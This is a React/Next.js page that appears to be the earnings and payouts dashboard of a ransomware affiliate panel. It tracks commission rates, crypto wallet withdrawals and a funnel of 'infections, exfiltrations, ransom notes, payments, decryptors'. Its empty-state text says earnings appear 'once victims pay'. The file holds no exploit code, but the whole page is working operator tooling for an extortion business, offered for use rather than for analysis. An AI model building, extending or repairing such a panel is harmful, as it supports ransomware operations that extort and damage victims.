'use client';

import { useState, useEffect } from 'react';
import { 
  DollarSign, 
  Wallet, 
  Clock, 
  CheckCircle, 
  XCircle, 
  AlertCircle,
  Download,
  RefreshCw,
  TrendingUp,
  ArrowUpRight,
  ArrowDownRight,
  Percent,
  Coins
} from 'lucide-react';
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/Card';
import { StatCard } from '@/components/ui/StatCard';
import { ChartCard } from '@/components/ui/ChartCard';
import { api } from '@/lib/api';
import { formatCurrency, formatNumber, formatDate, formatRelativeTime, cn } from '@/lib/utils';

interface EarningsStats {
  summary: {
    totalEarned: number;
    pendingEarnings: number;
    paidEarnings: number;
    availableForPayout: number;
    commissionRate: number;
    totalPayouts: number;
    avgPayout: number;
    lastPayoutDate: string;
  };
  daily: Array<{ date: string; earned: number; paid: number; pending: number }>;
  payouts: Array<{
    id: string;
    amount: number;
    status: 'pending' | 'processing' | 'completed' | 'failed' | 'cancelled';
    walletAddress: string;
    txHash?: string;
    requestedAt: string;
    completedAt?: string;
  }>;
  conversionFunnel: {
    infections: number;
    exfiltrations: number;
    ransomNotes: number;
    payments: number;
    decryptorsDelivered: number;
    conversionRate: number;
  };
}

export default function EarningsPage() {
  const [stats, setStats] = useState<EarningsStats | null>(null);
  const [loading, setLoading] = useState(true);
  const [range, setRange] = useState<'24h' | '7d' | '30d' | '90d'>('30d');
  const [payoutModal, setPayoutModal] = useState(false);
  const [payoutAmount, setPayoutAmount] = useState('');
  const [payoutWallet, setPayoutWallet] = useState('');
  const [requestingPayout, setRequestingPayout] = useState(false);

  useEffect(() => {
    fetchStats();
  }, [range]);

  const fetchStats = async () => {
    try {
      setLoading(true);
      const [overview, earnings, funnel] = await Promise.all([
        api.getOverviewStats(range),
        api.getEarningsStats(range),
        api.getConversionFunnel(),
      ]);
      setStats({
        summary: earnings.summary,
        daily: earnings.daily,
        payouts: earnings.payouts,
        conversionFunnel: funnel,
      });
    } catch (error) {
      console.error('Failed to fetch earnings:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleRequestPayout = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!payoutAmount || !payoutWallet) return;
    
    try {
      setRequestingPayout(true);
      await api.requestPayout(parseFloat(payoutAmount), payoutWallet);
      setPayoutModal(false);
      setPayoutAmount('');
      fetchStats();
    } catch (error) {
      console.error('Failed to request payout:', error);
    } finally {
      setRequestingPayout(false);
    }
  };

  const statCards = [
    {
      label: 'Total Earned',
      value: stats ? formatCurrency(stats.summary.totalEarned) : '—',
      change: stats ? `Commission: ${stats.summary.commissionRate}%` : null,
      changePositive: true,
      icon: DollarSign,
      color: 'chaos-gold',
    },
    {
      label: 'Available for Payout',
      value: stats ? formatCurrency(stats.summary.availableForPayout) : '—',
      change: stats ? `Pending: ${formatCurrency(stats.summary.pendingEarnings)}` : null,
      changePositive: true,
      icon: Wallet,
      color: 'chaos-emerald',
    },
    {
      label: 'Paid Out',
      value: stats ? formatCurrency(stats.summary.paidEarnings) : '—',
      change: stats ? `${stats.summary.totalPayouts} payouts` : null,
      changePositive: true,
      icon: Coins,
      color: 'chaos-sky',
    },
    {
      label: 'Conversion Rate',
      value: stats ? `${stats.summary.commissionRate}%` : '—',
      change: stats ? `Avg payout: ${formatCurrency(stats.summary.avgPayout)}` : null,
      changePositive: stats ? stats.summary.commissionRate > 50 : true,
      icon: Percent,
      color: 'chaos-violet',
    },
  ];

  if (loading) {
    return (
      <div className="space-y-6 animate-pulse">
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
          {[1, 2, 3, 4].map((i) => (
            <div key={i} className="card h-32 bg-chaos-border/20" />
          ))}
        </div>
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div className="card h-96 bg-chaos-border/20" />
          <div className="card h-96 bg-chaos-border/20" />
        </div>
        <div className="card h-96 bg-chaos-border/20" />
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div>
          <h1 className="text-3xl font-bold text-gradient">Earnings & Payouts</h1>
          <p className="text-gray-400 mt-1">Track your revenue and manage withdrawals</p>
        </div>
        <div className="flex items-center gap-2">
          <select
            value={range}
            onChange={(e) => setRange(e.target.value as any)}
            className="input-field w-auto"
          >
            <option value="24h">Last 24 Hours</option>
            <option value="7d">Last 7 Days</option>
            <option value="30d">Last 30 Days</option>
            <option value="90d">Last 90 Days</option>
          </select>
          {stats?.summary.availableForPayout && stats.summary.availableForPayout > 0 && (
            <button
              onClick={() => setPayoutModal(true)}
              className="btn-primary flex items-center gap-2"
            >
              <Wallet className="w-4 h-4" />
              Request Payout
            </button>
          )}
        </div>
      </div>

      {/* Stat Cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        {statCards.map((stat, i) => (
          <StatCard
            key={stat.label}
            label={stat.label}
            value={stat.value}
            change={stat.change}
            changePositive={stat.changePositive}
            icon={stat.icon}
            color={stat.color}
            delay={i * 50}
          />
        ))}
      </div>

      {/* Charts Row */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <ChartCard
          title="Earnings Timeline"
          subtitle={`Last ${range === '24h' ? '24 hours' : range === '7d' ? '7 days' : range === '30d' ? '30 days' : '90 days'}`}
          chartType="area"
          data={{
            labels: stats?.daily.map(d => d.date) || [],
            datasets: [
              {
                label: 'Earned',
                data: stats?.daily.map(d => d.earned) || [],
                borderColor: '#d6781e',
                backgroundColor: 'rgba(214, 120, 30, 0.2)',
                fill: true,
              },
              {
                label: 'Paid',
                data: stats?.daily.map(d => d.paid) || [],
                borderColor: '#10b981',
                backgroundColor: 'rgba(16, 185, 129, 0.2)',
                fill: true,
              },
              {
                label: 'Pending',
                data: stats?.daily.map(d => d.pending) || [],
                borderColor: '#f59e0b',
                backgroundColor: 'rgba(245, 158, 11, 0.2)',
                fill: true,
              },
            ],
          }}
          options={{
            scales: {
              y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' } },
              x: { grid: { color: 'rgba(255,255,255,0.05)' } },
            },
          }}
        />

        <ChartCard
          title="Conversion Funnel"
          subtitle="Infection to payment pipeline"
          chartType="bar"
          data={{
            labels: ['Infections', 'Exfiltrations', 'Ransom Notes', 'Payments', 'Decryptors'],
            datasets: [
              {
                label: 'Count',
                data: stats?.conversionFunnel ? [
                  stats.conversionFunnel.infections,
                  stats.conversionFunnel.exfiltrations,
                  stats.conversionFunnel.ransomNotes,
                  stats.conversionFunnel.payments,
                  stats.conversionFunnel.decryptorsDelivered,
                ] : [0, 0, 0, 0, 0],
                backgroundColor: [
                  'rgba(244, 63, 94, 0.6)',
                  'rgba(14, 165, 233, 0.6)',
                  'rgba(139, 92, 246, 0.6)',
                  'rgba(214, 120, 30, 0.6)',
                  'rgba(16, 185, 129, 0.6)',
                ],
                borderColor: [
                  '#f43f5e',
                  '#0ea5e9',
                  '#8b5cf6',
                  '#d6781e',
                  '#10b981',
                ],
                borderWidth: 1,
                borderRadius: 4,
              },
            ],
          }}
          options={{
            scales: {
              y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' } },
              x: { grid: { display: false } },
            },
            plugins: {
              tooltip: {
                callbacks: {
                  label: (ctx) => {
                    const funnel = stats?.conversionFunnel;
                    if (!funnel) return '';
                    const total = funnel.infections;
                    const pct = total > 0 ? ((ctx.raw / total) * 100).toFixed(1) : '0';
                    return `${ctx.dataset.label}: ${ctx.raw} (${pct}%)`;
                  },
                },
              },
            },
          }}
        />
      </div>

      {/* Payout History */}
      <div className="card">
        <CardHeader className="flex flex-row items-center justify-between pb-4">
          <CardTitle className="text-lg">Payout History</CardTitle>
          <button className="btn-secondary text-sm flex items-center gap-2" onClick={fetchStats}>
            <RefreshCw className="w-4 h-4" />
            Refresh
          </button>
        </CardHeader>
        <CardContent className="pt-0">
          <div className="table-container">
            <table className="w-full">
              <thead>
                <tr>
                  <th className="table-header">ID</th>
                  <th className="table-header">Amount</th>
                  <th className="table-header">Status</th>
                  <th className="table-header">Wallet</th>
                  <th className="table-header">TX Hash</th>
                  <th className="table-header">Requested</th>
                  <th className="table-header">Completed</th>
                </tr>
              </thead>
              <tbody>
                {stats?.payouts?.length ? (
                  stats.payouts.map((payout) => (
                    <tr key={payout.id} className="hover:bg-chaos-border/20">
                      <td className="table-cell font-mono text-xs">{payout.id.substring(0, 12)}...</td>
                      <td className="table-cell font-semibold text-chaos-gold">{formatCurrency(payout.amount)}</td>
                      <td className="table-cell">
                        <span className={cn(
                          'badge',
                          payout.status === 'completed' && 'badge-success',
                          payout.status === 'pending' && 'badge-warning',
                          payout.status === 'processing' && 'badge-info',
                          payout.status === 'failed' && 'badge-danger',
                          payout.status === 'cancelled' && 'badge-neutral'
                        )}>
                          {payout.status}
                        </span>
                      </td>
                      <td className="table-cell font-mono text-xs">{payout.walletAddress.substring(0, 12)}...{payout.walletAddress.substring(payout.walletAddress.length - 8)}</td>
                      <td className="table-cell font-mono text-xs">
                        {payout.txHash ? `${payout.txHash.substring(0, 12)}...${payout.txHash.substring(payout.txHash.length - 8)}` : '—'}
                      </td>
                      <td className="table-cell">{formatRelativeTime(payout.requestedAt)}</td>
                      <td className="table-cell">{payout.completedAt ? formatRelativeTime(payout.completedAt) : '—'}</td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td className="table-cell text-center text-gray-400" colSpan={7}>
                      No payouts yet. Earnings will appear here once victims pay.
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </CardContent>
      </div>

      {/* Payout Modal */}
      {payoutModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
          <div className="card w-full max-w-md mx-4 animate-in">
            <CardHeader>
              <CardTitle>Request Payout</CardTitle>
            </CardHeader>
            <form onSubmit={handleRequestPayout}>
              <CardContent className="space-y-4">
                <div>
                  <label className="block text-sm font-medium mb-1">Available Balance</label>
                  <div className="input-field bg-chaos-border/20 text-chaos-gold font-bold" style={{cursor: 'default'}}>
                    {formatCurrency(stats?.summary.availableForPayout || 0)}
                  </div>
                </div>
                <div>
                  <label className="block text-sm font-medium mb-1">Amount (USD)</label>
                  <input
                    type="number"
                    step="0.01"
                    min="10"
                    max={stats?.summary.availableForPayout || 0}
                    value={payoutAmount}
                    onChange={e => setPayoutAmount(e.target.value)}
                    className="input-field"
                    placeholder="Minimum $10"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium mb-1">Wallet Address (BTC/XMR/USDT)</label>
                  <input
                    type="text"
                    value={payoutWallet}
                    onChange={e => setPayoutWallet(e.target.value)}
                    className="input-field font-mono"
                    placeholder="Enter your crypto wallet address"
                    required
                  />
                </div>
                <p className="text-xs text-gray-400">
                  Payouts are processed within 24 hours. Minimum withdrawal: $10. Network fees deducted automatically.
                </p>
                <div className="flex gap-2 pt-4">
                  <button type="button" onClick={() => setPayoutModal(false)} className="btn-secondary flex-1">Cancel</button>
                  <button type="submit" disabled={requestingPayout} className="btn-primary flex-1">
                    {requestingPayout ? 'Processing...' : 'Request Payout'}
                  </button>
                </div>
              </CardContent>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}